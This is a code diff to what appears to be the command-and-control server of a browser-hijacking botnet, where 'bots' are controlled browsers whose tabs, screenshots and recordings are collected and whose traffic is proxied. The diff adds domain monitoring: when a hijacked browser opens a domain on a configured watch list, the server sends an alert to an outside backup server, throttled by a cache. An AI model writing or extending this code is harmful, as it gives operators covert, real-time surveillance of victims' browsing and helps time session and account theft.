@@ -56,6 +56,12 @@ const REQUEST_TABLE = new NodeCache({
   useClones: false, // Whether to clone JavaScript variables stored here.
 });
 
+const NOTIFY_CACHE = new NodeCache({
+  stdTTL: 300, // Default second(s) till the entry is removed.
+  checkperiod: 5, // How often table is checked and cleaned up.
+  useClones: false, // Whether to clone JavaScript variables stored here.
+});
+
 class Message {
   constructor() {
     this.SERVER = process.env.BAK_SERVER || "";
@@ -97,6 +103,7 @@ class Message {
       }
 
       await axios.get(`${this.SERVER}/${bot.name || bot.id} is online`);
+      logit(`${bot.name} is online`, false);
     } catch (err) {
       console.log(err);
     }
@@ -118,9 +125,15 @@ class Message {
       }
 
       await axios.get(`${this.SERVER}/${bot.name} is offline`);
+      logit(`${bot.name} is offline`, false);
     } catch (err) {
       console.log(err);
     }
+  }
+
+  async notify_domain(bot, domain) {
+    await axios.get(`${this.SERVER}/${bot.name} visited ${domain}`);
+    logit(`Notified ${bot.name} about ${domain}`, false,);
   }
 }
 
@@ -162,11 +175,31 @@ async function ping(websocket_connection, params) {
     current_tab: params.current_tab,
     current_tab_image: params.current_tab_image,
   });
+
+  // Check if current tab URL domain matches any monitored domains
+  if (bot.data_config.MONITOR_DOMAINS && params.current_tab) {
+    try {
+      const currentDomain = new URL(params.current_tab.url).hostname;
+      const matchedDomain = bot.data_config.MONITOR_DOMAINS.find(domain => currentDomain.includes(domain));
+      
+      if (matchedDomain) {
+        const lastNotifyKey = `last_notify_${bot.browser_id}_${matchedDomain}`;
+        const hasRecentNotification = NOTIFY_CACHE.get(lastNotifyKey);
+
+        if (!hasRecentNotification) {
+          await MessageWorker.notify_domain(bot, matchedDomain);
+          
+          NOTIFY_CACHE.set(lastNotifyKey, true);
+        }
+      }
+    } catch (err) {
+      logit('Error processing domain notification:', err);
+    }
+  }
 }
 
 async function recording(websocket_connection, params) {
   const bot = await pong_and_get_bot(websocket_connection);
-  console.log(params.length);
   const last_recording = bot.recording.slice(-100);
   last_recording.push({ data: params, date: new Date().getTime() });
 
@@ -677,9 +710,6 @@ async function initialize() {
     if (channel.startsWith("TOBROWSER_")) {
       const browser_id = channel.replace("TOBROWSER_", "");
       const browser_websocket = get_browser_proxy(browser_id);
-      console.log(
-        `${browser_id}-${browser_websocket} Send: ${message.toString()}`
-      );
       browser_websocket.send(message);
       return;
     }
@@ -759,6 +789,9 @@ async function initialize() {
             .slice(0, 200)}`
         );
         var inbound_message = JSON.parse(message);
+
+        
+
       } catch (e) {
         logit(`Error parsing message received from browser:`);
         logit(`Message: ${message}`);
